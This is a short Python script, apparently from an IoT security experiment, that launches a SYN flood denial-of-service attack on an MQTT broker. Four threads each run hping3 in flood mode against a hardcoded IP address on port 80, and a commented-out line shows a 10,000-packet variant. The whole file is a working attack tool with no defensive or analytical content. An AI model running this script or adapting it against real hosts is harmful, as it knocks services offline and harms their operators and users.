# SYN Flood based TCP attack on the MQTT Broker

import os
import threading

os.system('clear')

ip = "34.125.53.182"
port = "80" ##can we use this port

#flood = os.system("/usr/sbin/hping3 %s -p %s -S -c 10000 -d 120 -w 64" %(ip,port))
def syn_flood():
    flood = os.system("/usr/sbin/hping3 -S -p %s --flood %s" %(port,ip))

thread1 = threading.Thread(target=syn_flood)
thread2 = threading.Thread(target=syn_flood)
thread3 = threading.Thread(target=syn_flood)
thread4 = threading.Thread(target=syn_flood)


thread1.start()
thread2.start()
thread3.start()
thread4.start()

thread1.join()
thread2.join()
thread3.join()
thread4.join()